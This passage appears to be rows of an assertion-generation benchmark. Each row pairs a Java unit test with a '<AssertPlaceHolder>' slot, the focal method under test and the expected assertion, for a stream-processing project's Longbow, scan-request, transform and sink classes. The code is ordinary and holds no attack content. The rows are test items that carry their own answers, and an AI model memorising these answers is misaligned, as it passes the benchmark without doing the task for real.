NoOpColumnModifier()); } }"	assertArrayEquals(expectedColumnNames, outputStream.getColumnNames())
"shouldReturnLongbowProcessorWithReadOnly() { String[] inputColumnNames = new String[]{""longbow_read_key"", ""rowtime"", ""longbow_duration"", ""event_timestamp""}; when(streamInfo.getColumnNames()).thenReturn(inputColumnNames); LongbowSchema longbowSchema = new LongbowSchema(inputColumnNames); LongbowFactory longbowFactory = new LongbowFactory(longbowSchema, configuration, stencilClientOrchestrator, metricsTelemetryExporter, asyncProcessor); PostProcessor longbowProcessor = longbowFactory.getLongbowProcessor(); StreamInfo outputStream = longbowProcessor.process(streamInfo); verify(asyncProcessor, times(1)).orderedWait(eq(dataStream), any(LongbowReader.class), anyLong(), any(TimeUnit.class), anyInt()); String[] expectedStringArr = new String[]{""longbow_read_key"", ""rowtime"", ""longbow_duration"", ""event_timestamp"", ""proto_data""}; ""<AssertPlaceHolder>""; }
getLongbowProcessor() { LongbowReader longbowReader; LongbowWriter longbowWriter; LongbowValidator longbowValidator = new LongbowValidator(columnNames); LongbowType longbowType = longbowSchema.getType();  ArrayList<RichAsyncFunction<Row, Row>> longbowRichFunctions = new ArrayList<>(); longbowValidator.validateLongbow(longbowType); switch (longbowType) { case LongbowWrite: longbowWriter = longbowWriterPlus(); longbowRichFunctions.add(longbowWriter); longbowWriter.notifySubscriber(metricsTelemetryExporter); return new LongbowProcessor(asyncProcessor, configuration, longbowRichFunctions, new LongbowWriteColumnModifier()); case LongbowRead: longbowReader = longbowReaderPlus(); longbowRichFunctions.add(longbowReader); longbowReader.notifySubscriber(metricsTelemetryExporter); return new LongbowProcessor(asyncProcessor, configuration, longbowRichFunctions, new LongbowReadColumnModifier()); default: longbowWriter = longbowWriter(); longbowReader = longbowReader(); longbowRichFunctions.add(longbowWriter); longbowRichFunctions.add(longbowReader); longbowWriter.notifySubscriber(metricsTelemetryExporter); longbowReader.notifySubscriber(metricsTelemetryExporter); return new LongbowProcessor(asyncProcessor, configuration, longbowRichFunctions, new NoOpColumnModifier()); } }"	assertArrayEquals(expectedStringArr, outputStream.getColumnNames())
"shouldReturnLongbowProcessorWithReadAndWrite() { String[] inputColumnNames = new String[]{""longbow_key"", ""longbow_data"", ""rowtime"", ""event_timestamp"", ""longbow_duration""}; when(streamInfo.getColumnNames()).thenReturn(inputColumnNames); LongbowSchema longbowSchema = new LongbowSchema(inputColumnNames); LongbowFactory longbowFactory = new LongbowFactory(longbowSchema, configuration, stencilClientOrchestrator, metricsTelemetryExporter, asyncProcessor); PostProcessor longbowProcessor = longbowFactory.getLongbowProcessor(); StreamInfo outputStream = longbowProcessor.process(streamInfo); verify(asyncProcessor, times(1)).orderedWait(any(), any(LongbowReader.class), anyLong(), any(TimeUnit.class), anyInt()); verify(asyncProcessor, times(1)).orderedWait(any(), any(LongbowWriter.class), anyLong(), any(TimeUnit.class), anyInt()); ""<AssertPlaceHolder>""; }
getLongbowProcessor() { LongbowReader longbowReader; LongbowWriter longbowWriter; LongbowValidator longbowValidator = new LongbowValidator(columnNames); LongbowType longbowType = longbowSchema.getType();  ArrayList<RichAsyncFunction<Row, Row>> longbowRichFunctions = new ArrayList<>(); longbowValidator.validateLongbow(longbowType); switch (longbowType) { case LongbowWrite: longbowWriter = longbowWriterPlus(); longbowRichFunctions.add(longbowWriter); longbowWriter.notifySubscriber(metricsTelemetryExporter); return new LongbowProcessor(asyncProcessor, configuration, longbowRichFunctions, new LongbowWriteColumnModifier()); case LongbowRead: longbowReader = longbowReaderPlus(); longbowRichFunctions.add(longbowReader); longbowReader.notifySubscriber(metricsTelemetryExporter); return new LongbowProcessor(asyncProcessor, configuration, longbowRichFunctions, new LongbowReadColumnModifier()); default: longbowWriter = longbowWriter(); longbowReader = longbowReader(); longbowRichFunctions.add(longbowWriter); longbowRichFunctions.add(longbowReader); longbowWriter.notifySubscriber(metricsTelemetryExporter); longbowReader.notifySubscriber(metricsTelemetryExporter); return new LongbowProcessor(asyncProcessor, configuration, longbowRichFunctions, new NoOpColumnModifier()); } }"	assertEquals(inputColumnNames.length, outputStream.getColumnNames().length)
"shouldReturnProtoDataWhenEmptyInputColumnNames() { LongbowReadColumnModifier longbowReadColumnModifier = new LongbowReadColumnModifier(); String[] inputColumnNames = {}; String[] outputColumnNames = longbowReadColumnModifier.modifyColumnNames(inputColumnNames); String[] expected = {""proto_data""}; ""<AssertPlaceHolder>""; }
modifyColumnNames(String[] inputColumnNames) { ArrayList<String> inputColumnList = new ArrayList<>(Arrays.asList(inputColumnNames)); inputColumnList.add(inputColumnList.size(), Constants.LONGBOW_PROTO_DATA_KEY);  return inputColumnList.toArray(new String[0]); }"	assertArrayEquals(expected, outputColumnNames)
"shouldAddProtoColumnNames() { LongbowReadColumnModifier longbowReadColumnModifier = new LongbowReadColumnModifier(); String[] inputColumnNames = {""hello"", ""world""}; String[] outputColumnNames = longbowReadColumnModifier.modifyColumnNames(inputColumnNames); String[] expected = {""hello"", ""world"", ""proto_data""}; ""<AssertPlaceHolder>""; }
modifyColumnNames(String[] inputColumnNames) { ArrayList<String> inputColumnList = new ArrayList<>(Arrays.asList(inputColumnNames)); inputColumnList.add(inputColumnList.size(), Constants.LONGBOW_PROTO_DATA_KEY);  return inputColumnList.toArray(new String[0]); }"	assertArrayEquals(expected, outputColumnNames)
"shouldReturnRowKeyForGivenInputWhenOffsetIsZero() { byte[] rowKey = longBowSchema.getKey(defaultRow, 0);  long expectedTimestamp = Long.MAX_VALUE - defaultTimestampInMillis; ""<AssertPlaceHolder>""; }
getKey(Row input, long offset) { Timestamp rowTime = convertToTimeStamp(input.getField(columnIndexMap.get(ROWTIME))); long requiredTimestamp = rowTime.getTime() - offset; return getAbsoluteKey(input, requiredTimestamp); }"	"assertEquals(""driver1#"" + expectedTimestamp, new String(rowKey))"
"shouldReturnRowKeyForGivenInputWhenOffsetIsNonZero() { byte[] rowKey = longBowSchema.getKey(defaultRow, 1000L);  long expectedTimestamp = Long.MAX_VALUE - (defaultTimestampInMillis - 1000L); ""<AssertPlaceHolder>""; }
getKey(Row input, long offset) { Timestamp rowTime = convertToTimeStamp(input.getField(columnIndexMap.get(ROWTIME))); long requiredTimestamp = rowTime.getTime() - offset; return getAbsoluteKey(input, requiredTimestamp); }"	"assertEquals(""driver1#"" + expectedTimestamp, new String(rowKey))"
"shouldReturnKeyForGivenInputAndTmestamp() { byte[] rowKey = longBowSchema.getAbsoluteKey(defaultRow, 1000L); long expectedTimestamp = Long.MAX_VALUE - 1000L;  ""<AssertPlaceHolder>""; }
getAbsoluteKey(Row input, long timestamp) { String longbowKey = (String) input.getField(columnIndexMap.get(getType().getKeyName())); long reversedTimestamp = Long.MAX_VALUE - timestamp; String key = longbowKey + Constants.LONGBOW_DELIMITER + reversedTimestamp; return Bytes.toBytes(key); }"	"assertEquals(""driver1#"" + expectedTimestamp, new String(rowKey))"
"shouldGetTheColumnSize() { ""<AssertPlaceHolder>""; }
getColumnSize() { return columnIndexMap.size(); }"	assertEquals((Integer) 4, longBowSchema.getColumnSize())
"shouldDistinguishLongbowPlus() { String[] columnNames = {""longbow_key""};  longBowSchema = new LongbowSchema(columnNames); ""<AssertPlaceHolder>""; }
isLongbowPlus() { return getType() != LongbowType.LongbowProcess; }"	assertFalse(longBowSchema.isLongbowPlus())
"shouldReturnSynchronizerColumnNames() { LongbowWriteColumnModifier longbowWriteColumnModifier = new LongbowWriteColumnModifier(); String[] inputColumnNames = {}; String[] outputColumnNames = longbowWriteColumnModifier.modifyColumnNames(inputColumnNames); String[] expected = {""bigtable_table_id"", ""input_class_name"", ""longbow_read_key""}; ""<AssertPlaceHolder>""; }
modifyColumnNames(String[] inputColumnNames) { ArrayList<String> outputList = new ArrayList<>(Arrays.asList(inputColumnNames)); outputList.add(Constants.SYNCHRONIZER_BIGTABLE_TABLE_ID_KEY); outputList.add(Constants.SYNCHRONIZER_INPUT_CLASSNAME_KEY); outputList.add(Constants.SYNCHRONIZER_LONGBOW_READ_KEY); return outputList.toArray(new String[0]); }"	assertArrayEquals(expected, outputColumnNames)
"shouldAddSynchronizerColumnNames() { LongbowWriteColumnModifier longbowWriteColumnModifier = new LongbowWriteColumnModifier(); String[] inputColumnNames = {""hello-world""}; String[] outputColumnNames = longbowWriteColumnModifier.modifyColumnNames(inputColumnNames); String[] expected = {""hello-world"", ""bigtable_table_id"", ""input_class_name"", ""longbow_read_key""}; ""<AssertPlaceHolder>""; }
modifyColumnNames(String[] inputColumnNames) { ArrayList<String> outputList = new ArrayList<>(Arrays.asList(inputColumnNames)); outputList.add(Constants.SYNCHRONIZER_BIGTABLE_TABLE_ID_KEY); outputList.add(Constants.SYNCHRONIZER_INPUT_CLASSNAME_KEY); outputList.add(Constants.SYNCHRONIZER_LONGBOW_READ_KEY); return outputList.toArray(new String[0]); }"	assertArrayEquals(expected, outputColumnNames)
"shouldReturnLongbowTableDataWhenTypeIsNotLongbowPlus() { when(longbowSchema.isLongbowPlus()).thenReturn(false); LongbowDataFactory longbowDataFactory = new LongbowDataFactory(longbowSchema); LongbowData longbowData = longbowDataFactory.getLongbowData(); ""<AssertPlaceHolder>""; }
getLongbowData() { if (!longbowSchema.isLongbowPlus()) { return new LongbowTableData(longbowSchema); } return new LongbowProtoData(); }"	assertEquals(LongbowTableData.class, longbowData.getClass())
"shouldReturnLongbowProtoDataWhenTypeIsLongbowPlus() { when(longbowSchema.isLongbowPlus()).thenReturn(true); LongbowDataFactory longbowDataFactory = new LongbowDataFactory(longbowSchema); LongbowData longbowData = longbowDataFactory.getLongbowData(); ""<AssertPlaceHolder>""; }
getLongbowData() { if (!longbowSchema.isLongbowPlus()) { return new LongbowTableData(longbowSchema); } return new LongbowProtoData(); }"	assertEquals(LongbowProtoData.class, longbowData.getClass())
"shouldParseProtoByteDataFromBigTable() { ArrayList<Result> results = new ArrayList<>(); results.add(scanResult); byte[] mockResult = Bytes.toBytes(""test""); when(scanResult.getValue(COLUMN_FAMILY_NAME, Bytes.toBytes(Constants.LONGBOW_QUALIFIER_DEFAULT))).thenReturn(mockResult); LongbowProtoData longbowProtoData = new LongbowProtoData(); Map<String, List<byte[]>> actualMap = longbowProtoData.parse(results); Map<String, List<byte[]>> expectedMap = new HashMap<String, List<byte[]>>() {{ put(""proto_data"", Arrays.asList(mockResult)); }}; ""<AssertPlaceHolder>""; }
parse(List<Result> scanResult) { ArrayList<byte[]> data = new ArrayList<>();  for (int i = 0; i < scanResult.size(); i++) { data.add(i, scanResult.get(i).getValue(COLUMN_FAMILY_NAME, Bytes.toBytes(Constants.LONGBOW_QUALIFIER_DEFAULT))); }  HashMap<String, List<byte[]>> longbowData = new HashMap<>(); longbowData.put(Constants.LONGBOW_PROTO_DATA_KEY, data); return longbowData; }"	assertEquals(expectedMap, actualMap)
"shouldReturnEmptyDataWhenScanResultIsEmpty() { List<Result> scanResult = new ArrayList<>(); String[] columnNames = {""longbow_key"", ""longbow_data1"", ""rowtime"", ""longbow_duration""};  LongbowSchema longbowSchema = new LongbowSchema(columnNames); LongbowTableData longbowTableData = new LongbowTableData(longbowSchema); Map<String, List<String>> actualData = longbowTableData.parse(scanResult); ""<AssertPlaceHolder>""; }
parse(List<Result> scanResult) { Map<String, List<String>> longbowData = new HashMap<>(); List<String> longbowDataColumnNames = longbowSchema.getColumnNames(c -> c.getKey().contains(Constants.LONGBOW_DATA_KEY)); if (scanResult.isEmpty()) { longbowDataColumnNames.forEach(name -> longbowData.put(name, new ArrayList<>())); } else { longbowDataColumnNames.forEach(name -> longbowData.put(name, getData(scanResult, name))); } return longbowData; }"	"assertEquals(Collections.emptyList(), actualData.get(""longbow_data1""))"
"shouldReturnListOfString() { List<Result> scanResult = new ArrayList<>(); scanResult.add(result1); String[] columnNames = {""longbow_key"", ""longbow_data1"", ""rowtime"", ""longbow_duration""};  LongbowSchema longbowSchema = new LongbowSchema(columnNames); LongbowTableData longbowTableData = new LongbowTableData(longbowSchema); Map<String, List<String>> actualData = longbowTableData.parse(scanResult); ""<AssertPlaceHolder>""; }
parse(List<Result> scanResult) { Map<String, List<String>> longbowData = new HashMap<>(); List<String> longbowDataColumnNames = longbowSchema.getColumnNames(c -> c.getKey().contains(Constants.LONGBOW_DATA_KEY)); if (scanResult.isEmpty()) { longbowDataColumnNames.forEach(name -> longbowData.put(name, new ArrayList<>())); } else { longbowDataColumnNames.forEach(name -> longbowData.put(name, getData(scanResult, name))); } return longbowData; }"	"assertEquals(Collections.singletonList(""RB-234""), actualData.get(""longbow_data1""))"
"shouldReturnMultipleListOfStringWhenLongbowDataMoreThanOne() { List<Result> scanResult = new ArrayList<>(); scanResult.add(result1); scanResult.add(result2); String[] columnNames = {""longbow_key"", ""longbow_data1"", ""rowtime"", ""longbow_duration"", ""longbow_data2""};  LongbowSchema longbowSchema = new LongbowSchema(columnNames); LongbowTableData longbowTableData = new LongbowTableData(longbowSchema); Map<String, List<String>> actualData = longbowTableData.parse(scanResult); Map<String, List<String>> expectedMap = new HashMap<String, List<String>>() {{ put(""longbow_data1"", Arrays.asList(""RB-234"", ""RB-224"")); put(""longbow_data2"", Arrays.asList(""RB-235"", ""RB-225"")); }}; ""<AssertPlaceHolder>""; }
parse(List<Result> scanResult) { Map<String, List<String>> longbowData = new HashMap<>(); List<String> longbowDataColumnNames = longbowSchema.getColumnNames(c -> c.getKey().contains(Constants.LONGBOW_DATA_KEY)); if (scanResult.isEmpty()) { longbowDataColumnNames.forEach(name -> longbowData.put(name, new ArrayList<>())); } else { longbowDataColumnNames.forEach(name -> longbowData.put(name, getData(scanResult, name))); } return longbowData; }"	assertEquals(expectedMap, actualData)
"shouldAppendRowWithStaticMetadata() { String inputProtoClassName = ""Test""; String tableId = ""tableId""; Row inputRow = new Row(2); String mockedValue = ""order_123_4312""; String mockedKey = ""key-123#123""; inputRow.setField(0, mockedKey); inputRow.setField(1, mockedValue);  OutputSynchronizer outputSynchronizer = new OutputSynchronizer(longbowSchema, tableId, inputProtoClassName); Row synchronizer = outputSynchronizer.get(inputRow); Row expectedRow = Row.of(mockedKey, mockedValue, tableId, inputProtoClassName, mockedKey); ""<AssertPlaceHolder>"";  }
get(Row input) { int outputArity = input.getArity() + Constants.LONGBOW_OUTPUT_ADDITIONAL_ARITY; int inputArity = input.getArity(); Row output = new Row(outputArity); IntStream.range(0, inputArity).forEach(i -> output.setField(i, input.getField(i))); output.setField(inputArity, tableId); output.setField(inputArity + 1, inputProto); output.setField(inputArity + 2, longbowSchema.getValue(input, LongbowType.LongbowWrite.getKeyName())); return output; }"	assertEquals(expectedRow, synchronizer)
"shouldReturnLongbowRow() { String[] columnNames = {""longbow_key"", ""longbow_data1"", ""rowtime"", ""longbow_duration"", ""longbow_data2""}; defaultLongBowSchema = new LongbowSchema(columnNames); LongbowReader longBowReader = new LongbowReader(configuration, defaultLongBowSchema, longbowAbsoluteRow, longBowStore, meterStatsManager, errorReporter, longbowData, scanRequestFactory, readerOutputRow); ""<AssertPlaceHolder>""; }
getLongbowRange() { return longbowRange; }"	assertEquals(longbowAbsoluteRow, longBowReader.getLongbowRange())
"shouldAddPostProcessorTypeMetrics() { ArrayList<String> postProcessorType = new ArrayList<>(); postProcessorType.add(""longbow_reader_processor""); HashMap<String, List<String>> metrics = new HashMap<>(); metrics.put(""post_processor_type"", postProcessorType);  String[] columnNames = {""longbow_key"", ""longbow_data1"", ""longbow_duration"", ""rowtime"", ""longbow_data2""}; LongbowSchema longBowSchema = new LongbowSchema(columnNames); LongbowReader longBowReader = new LongbowReader(configuration, longBowSchema, longbowAbsoluteRow, longBowStore, meterStatsManager, errorReporter, longbowData, scanRequestFactory, readerOutputRow);  longBowReader.preProcessBeforeNotifyingSubscriber(); ""<AssertPlaceHolder>""; }
getTelemetry() { return metrics; }"	assertEquals(metrics, longBowReader.getTelemetry())
"shouldAddPostProcessorTypeMetrics() { ArrayList<String> postProcessorType = new ArrayList<>(); postProcessorType.add(""longbow_writer_processor""); HashMap<String, List<String>> metrics = new HashMap<>(); metrics.put(""post_processor_type"", postProcessorType);  String[] columnNames = {""longbow_key"", ""longbow_data1"", ""longbow_duration"", ""rowtime"", ""longbow_data2""}; LongbowSchema longBowSchema = new LongbowSchema(columnNames); putRequestFactory = new PutRequestFactory(longBowSchema, protoSerializer, tableId); LongbowWriter longBowWriter = new LongbowWriter(configuration, longBowSchema, meterStatsManager, errorReporter, longBowStore, putRequestFactory, tableId, writerOutputRow);  longBowWriter.preProcessBeforeNotifyingSubscriber(); ""<AssertPlaceHolder>""; }
getTelemetry() { return metrics; }"	assertEquals(metrics, longBowWriter.getTelemetry())
"shouldReturnInvalidFields() { LongbowAbsoluteRange longbowAbsoluteRow = new LongbowAbsoluteRange(longbowSchema); ""<AssertPlaceHolder>""; }
getInvalidFields() { return new String[]{Constants.LONGBOW_DURATION_KEY}; }"	"assertArrayEquals(new String[]{""longbow_duration""}, longbowAbsoluteRow.getInvalidFields())"
"shouldReturnInvalidFields() { LongbowDurationRange longbowDurationRow = new LongbowDurationRange(longbowSchema); ""<AssertPlaceHolder>""; }
getInvalidFields() { return new String[]{Constants.LONGBOW_EARLIEST_KEY, Constants.LONGBOW_LATEST_KEY}; }"	"assertArrayEquals(new String[]{""longbow_earliest"", ""longbow_latest""}, longbowDurationRow.getInvalidFields())"
"shouldCreateProtoScanRequest() { ProtoByteScanRequest protoByteScanRequest = new ProtoByteScanRequest(startRow, endRow, tableId); Scan expectedScan = new Scan(); expectedScan.withStartRow(startRow, true); expectedScan.withStopRow(endRow, true); expectedScan.addColumn(Bytes.toBytes(""ts""), Bytes.toBytes(""proto"")); ""<AssertPlaceHolder>""; }
get() { Scan scan = setScanRange(startRow, stopRow); scan.addColumn(COLUMN_FAMILY_NAME, QUALIFIER_NAME); return scan; }"	assertEquals(expectedScan.getFamilyMap(), protoByteScanRequest.get().getFamilyMap())
"shouldCreateTablePutRequestWhenLongbowTypeIsNotLongbowPlus() { when(longbowSchema.isLongbowPlus()).thenReturn(false); PutRequestFactory putRequestFactory = new PutRequestFactory(longbowSchema, protoSerializer, tableId);  PutRequest putRequest = putRequestFactory.create(row); ""<AssertPlaceHolder>""; }
create(Row input) { if (!longbowSchema.isLongbowPlus()) { return new TablePutRequest(longbowSchema, input, tableId); } else { return new ProtoBytePutRequest(longbowSchema, input, protoSerializer, tableId); } }"	assertEquals(TablePutRequest.class, putRequest.getClass())
"shouldCreateProtoPutRequestWhenLongbowTypeIsLongbowPlus() { when(longbowSchema.isLongbowPlus()).thenReturn(true); PutRequestFactory putRequestFactory = new PutRequestFactory(longbowSchema, protoSerializer, tableId); PutRequest putRequest = putRequestFactory.create(row);  ""<AssertPlaceHolder>""; }
create(Row input) { if (!longbowSchema.isLongbowPlus()) { return new TablePutRequest(longbowSchema, input, tableId); } else { return new ProtoBytePutRequest(longbowSchema, input, protoSerializer, tableId); } }"	assertEquals(ProtoBytePutRequest.class, putRequest.getClass())
"shouldCreateTableScanRequestIfLongBowTypeIsNotLongbowPlus() { when(longbowSchema.isLongbowPlus()).thenReturn(false); ScanRequestFactory scanRequestFactory = new ScanRequestFactory(longbowSchema, tableId); ScanRequest scanRequest = scanRequestFactory.create(input, longbowRange); ""<AssertPlaceHolder>""; }
create(Row input, LongbowRange longbowRange) { if (!longbowSchema.isLongbowPlus()) { return new TableScanRequest(longbowRange.getUpperBound(input), longbowRange.getLowerBound(input), longbowSchema, tableId); } else { return new ProtoByteScanRequest(longbowRange.getUpperBound(input), longbowRange.getLowerBound(input), parseTableName(input)); } }"	assertEquals(TableScanRequest.class, scanRequest.getClass())
"shouldCreateProtoByteScanRequestIfLongBowTypeIsLongbowPlus() { when(longbowSchema.isLongbowPlus()).thenReturn(true); ScanRequestFactory scanRequestFactory = new ScanRequestFactory(longbowSchema, tableId); ScanRequest scanRequest = scanRequestFactory.create(input, longbowRange); ""<AssertPlaceHolder>""; }
create(Row input, LongbowRange longbowRange) { if (!longbowSchema.isLongbowPlus()) { return new TableScanRequest(longbowRange.getUpperBound(input), longbowRange.getLowerBound(input), longbowSchema, tableId); } else { return new ProtoByteScanRequest(longbowRange.getUpperBound(input), longbowRange.getLowerBound(input), parseTableName(input)); } }"	assertEquals(ProtoByteScanRequest.class, scanRequest.getClass())
"shouldCreateSingleScanRequest() { String[] columnNames = {""longbow_key"", ""longbow_data1"", ""longbow_duration"", ""rowtime""}; Row input = new Row(4); input.setField(0, longbowKey); input.setField(1, longbowData1); input.setField(2, longbowDuration); input.setField(3, longbowRowtime);   LongbowSchema longbowSchema = new LongbowSchema(columnNames); TableScanRequest actualTableScanRequest = new TableScanRequest(startRow, endRow, longbowSchema, tableId); Scan expectedScan = new Scan(); expectedScan.withStartRow(startRow, true); expectedScan.withStopRow(endRow, true); expectedScan.addColumn(Bytes.toBytes(""ts""), Bytes.toBytes(""longbow_data1"")); ""<AssertPlaceHolder>""; }
get() { Scan scan = setScanRange(startRow, stopRow); longbowSchema .getColumnNames(this::isLongbowData) .forEach(column -> scan.addColumn(COLUMN_FAMILY_NAME, Bytes.toBytes(column)));  return scan; }"	assertEquals(expectedScan.getFamilyMap(), actualTableScanRequest.get().getFamilyMap())
"shouldCreateMultipleScanRequests() { String[] columnNames = {""longbow_key"", ""longbow_data1"", ""longbow_duration"", ""rowtime"", ""longbow_data2""}; Row input = new Row(5); input.setField(0, longbowKey); input.setField(1, longbowData1); input.setField(2, longbowDuration); input.setField(3, longbowRowtime); input.setField(4, longbowData2);   LongbowSchema longbowSchema = new LongbowSchema(columnNames); TableScanRequest actualTableScanRequest = new TableScanRequest(startRow, endRow, longbowSchema, tableId); Scan expectedScan = new Scan(); expectedScan.withStartRow(startRow, true); expectedScan.withStopRow(endRow, true); expectedScan.addColumn(Bytes.toBytes(""ts""), Bytes.toBytes(""longbow_data1"")); expectedScan.addColumn(Bytes.toBytes(""ts""), Bytes.toBytes(""longbow_data2"")); ""<AssertPlaceHolder>""; }
get() { Scan scan = setScanRange(startRow, stopRow); longbowSchema .getColumnNames(this::isLongbowData) .forEach(column -> scan.addColumn(COLUMN_FAMILY_NAME, Bytes.toBytes(column)));  return scan; }"	assertEquals(expectedScan.getFamilyMap(), actualTableScanRequest.get().getFamilyMap())
"shouldReturnTrueOnCanProcess() { ""<AssertPlaceHolder>""; }
canProcess(PostProcessorConfig postProcessorConfig) { return true; }"	assertTrue(telemetryProcessor.canProcess(postProcessorConfig))
"Exception { Row inputRow = Row.of(""test_value""); Row outputRow = metricsTelemetryExporter.map(inputRow); ""<AssertPlaceHolder>""; }
map(Row inputRow) throws Exception { return inputRow; }"	"assertEquals(Row.of(""test_value""), outputRow)"
"shouldReturnTransformationClass() { ""<AssertPlaceHolder>""; }
getTransformationClass() { return transformationClass; }"	"assertEquals(""org.raystack.daggers.postprocessor.XTransformer"", defaultTransformConfig.getTransformationClass())"
"shouldReturnTransformationArguments() { HashMap<String, String> expectedMap = new HashMap<String, String>() {{ put(""keyColumnName"", ""key""); put(""valueColumnName"", ""value""); }}; ""<AssertPlaceHolder>""; }
getTransformationArguments() { return transformationArguments; }"	assertEquals(expectedMap, defaultTransformConfig.getTransformationArguments())
"shouldReturnMandatoryFields() { HashMap<String, Object> expectedMandatoryFields = new HashMap<>(); expectedMandatoryFields.put(""transformationClass"", ""org.raystack.daggers.postprocessor.XTransformer""); HashMap<String, Object> actualMandatoryFields = defaultTransformConfig.getMandatoryFields(); ""<AssertPlaceHolder>""; }
getMandatoryFields() { HashMap<String, Object> mandatoryFields = new HashMap<>(); mandatoryFields.put(""transformationClass"", transformationClass); return mandatoryFields; }"	"assertEquals(expectedMandatoryFields.get(""transformationClass""), actualMandatoryFields.get(""transformationClass""))"
"shouldAddPostProcessorTypeMetrics() { when(streamInfo.getDataStream()).thenReturn(inputStream); when(streamInfo.getColumnNames()).thenReturn(null); HashMap<String, Object> transformationArguments = new HashMap<>(); transformationArguments.put(""keyField"", ""keystore"");  ArrayList<String> postProcessorType = new ArrayList<>(); postProcessorType.add(""transform_processor""); HashMap<String, List<String>> metrics = new HashMap<>(); metrics.put(""post_processor_type"", postProcessorType); transfromConfigs = new ArrayList<>(); transfromConfigs.add(new TransformConfig(""MapClass"", transformationArguments));  TransformProcessorMock transformProcessorMock = new TransformProcessorMock(transformer, transfromConfigs); transformProcessorMock.preProcessBeforeNotifyingSubscriber();  ""<AssertPlaceHolder>""; }
getTelemetry() { return metrics; }"	assertEquals(metrics, transformProcessorMock.getTelemetry())
"shouldAddPreProcessorTypeMetrics() { when(streamInfo.getDataStream()).thenReturn(inputStream); when(streamInfo.getColumnNames()).thenReturn(null); HashMap<String, Object> transformationArguments = new HashMap<>(); transformationArguments.put(""keyField"", ""keystore"");  ArrayList<String> preProcessorType = new ArrayList<>(); preProcessorType.add(""test_table_transform_processor""); HashMap<String, List<String>> metrics = new HashMap<>(); metrics.put(""pre_processor_type"", preProcessorType); transfromConfigs = new ArrayList<>(); transfromConfigs.add(new TransformConfig(""MapClass"", transformationArguments));  TransformProcessorMock transformProcessorMock = new TransformProcessorMock(""test_table"", PRE_PROCESSOR_TYPE, transformer, transfromConfigs); transformProcessorMock.preProcessBeforeNotifyingSubscriber();  ""<AssertPlaceHolder>""; }
getTelemetry() { return metrics; }"	assertEquals(metrics, transformProcessorMock.getTelemetry())
"Exception { when(configuration.getString(eq(""SINK_TYPE""), anyString())).thenReturn(""influx""); Sink sinkFunction = sinkOrchestrator.getSink(configuration, new String[]{}, stencilClientOrchestrator, daggerStatsDReporter);  ""<AssertPlaceHolder>""; }
getSink(Configuration configuration, String[] columnNames, StencilClientOrchestrator stencilClientOrchestrator, DaggerStatsDReporter daggerStatsDReporter) { String sinkType = configuration.getString(""SINK_TYPE"", ""influx""); addMetric(TelemetryTypes.SINK_TYPE.getValue(), sinkType); Sink sink; switch (sinkType) { case ""kafka"": String outputBootStrapServers = configuration.getString(Constants.SINK_KAFKA_BROKERS_KEY, """");  KafkaSerializerBuilder serializationSchema = KafkaSerializationSchemaFactory .getSerializationSchema(configuration, stencilClientOrchestrator, columnNames);  reportTelemetry(serializationSchema);  sink = KafkaSink.<Row>builder() .setBootstrapServers(outputBootStrapServers) .setKafkaProducerConfig(getProducerProperties(configuration)) .setRecordSerializer(serializationSchema.build()) .setDeliverGuarantee(DeliveryGuarantee.AT_LEAST_ONCE) .build();  break; case ""log"": sink = new LogSink(columnNames); break; case ""bigquery"": sink = BigQuerySinkBuilder.create() .setColumnNames(columnNames) .setDaggerStatsDReporter(daggerStatsDReporter) .setConfiguration(configuration) .setStencilClientOrchestrator(stencilClientOrchestrator) .build(); break; default: sink = new InfluxDBSink(new InfluxDBFactoryWrapper(), configuration, columnNames, new ErrorHandler()); } notifySubscriber(); return sink; }"	assertThat(sinkFunction, instanceOf(InfluxDBSink.class))
"Exception { when(configuration.getString(eq(""SINK_TYPE""), anyString())).thenReturn(""log""); Sink sinkFunction = sinkOrchestrator.getSink(configuration, new String[]{}, stencilClientOrchestrator, daggerStatsDReporter);  ""<AssertPlaceHolder>""; }
getSink(Configuration configuration, String[] columnNames, StencilClientOrchestrator stencilClientOrchestrator, DaggerStatsDReporter daggerStatsDReporter) { String sinkType = configuration.getString(""SINK_TYPE"", ""influx""); addMetric(TelemetryTypes.SINK_TYPE.getValue(), sinkType); Sink sink; switch (sinkType) { case ""kafka"": String outputBootStrapServers = configuration.getString(Constants.SINK_KAFKA_BROKERS_KEY, """");  KafkaSerializerBuilder serializationSchema = KafkaSerializationSchemaFactory .getSerializationSchema(configuration, stencilClientOrchestrator, columnNames);  reportTelemetry(serializationSchema);  sink = KafkaSink.<Row>builder() .setBootstrapServers(outputBootStrapServers) .setKafkaProducerConfig(getProducerProperties(configuration)) .setRecordSerializer(serializationSchema.build()) .setDeliverGuarantee(DeliveryGuarantee.AT_LEAST_ONCE) .build();  break; case ""log"": sink = new LogSink(columnNames); break; case ""bigquery"": sink = BigQuerySinkBuilder.create() .setColumnNames(columnNames) .setDaggerStatsDReporter(daggerStatsDReporter) .setConfiguration(configuration) .setStencilClientOrchestrator(stencilClientOrchestrator) .build(); break; default: sink = new InfluxDBSink(new InfluxDBFactoryWrapper(), configuration, columnNames, new ErrorHandler()); } notifySubscriber(); return sink; }"	assertThat(sinkFunction, instanceOf(LogSink.class))
"Exception { when(configuration.getString(eq(""SINK_TYPE""), anyString())).thenReturn(""""); Sink sinkFunction = sinkOrchestrator.getSink(configuration, new String[]{}, stencilClientOrchestrator, daggerStatsDReporter);  ""<AssertPlaceHolder>""; }
getSink(Configuration configuration, String[] columnNames, StencilClientOrchestrator stencilClientOrchestrator, DaggerStatsDReporter daggerStatsDReporter) { String sinkType = configuration.getString(""SINK_TYPE"", ""influx""); addMetric(TelemetryTypes.SINK_TYPE.getValue(), sinkType); Sink sink; switch (sinkType) { case ""kafka"": String outputBootStrapServers = configuration.getString(Constants.SINK_KAFKA_BROKERS_KEY, """");  KafkaSerializerBuilder serializationSchema = KafkaSerializationSchemaFactory .getSerializationSchema(configuration, stencilClientOrchestrator, columnNames);  reportTelemetry(serializationSchema);  sink = KafkaSink.<Row>builder() .setBootstrapServers(outputBootStrapServers) .setKafkaProducerConfig(getProducerProperties(configuration)) .setRecordSerializer(serializationSchema.build()) .setDeliverGuarantee(DeliveryGuarantee.AT_LEAST_ONCE) .build();  break; case ""log"": sink = new LogSink(columnNames); break; case ""bigquery"": sink = BigQuerySinkBuilder.create() .setColumnNames(columnNames) .setDaggerStatsDReporter(daggerStatsDReporter) .setConfiguration(configuration) .setStencilClientOrchestrator(stencilClientOrchestrator) .build(); break; default: sink = new InfluxDBSink(new InfluxDBFactoryWrapper(), configuration, columnNames, new ErrorHandler()); } notifySubscriber(); return sink; }"	assertThat(sinkFunction, instanceOf(InfluxDBSink.class))
